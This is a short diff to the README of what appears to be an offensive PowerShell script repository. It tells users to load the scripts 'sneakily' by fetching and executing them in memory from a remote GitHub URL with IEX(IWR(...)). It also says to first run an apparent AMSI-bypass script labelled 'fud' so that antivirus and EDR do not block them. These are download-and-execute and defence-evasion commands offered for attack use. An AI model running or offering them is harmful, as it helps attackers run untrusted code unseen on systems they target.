@@ -6,8 +6,11 @@ They are all provided without warranty and they may or may not break things. You
 
 # usage
 All the scripts can be used locally but since we're using powershell and we're trying to be sneaky it is probably better to load them from a webserver using the classic IEX(IWR('https://github.com/RaouzRouik/smallposh/thescriptyouwant.ps1')) or on your very own webserver if you prefer
+
 You should definitely start by invoking 
+
 IEX(IWR('https://github.com/RaouzRouik/smallposh/amsibp-dec-2021-fud.ps1'))
+
 or else AV/EDR will surely block you right away
 
 
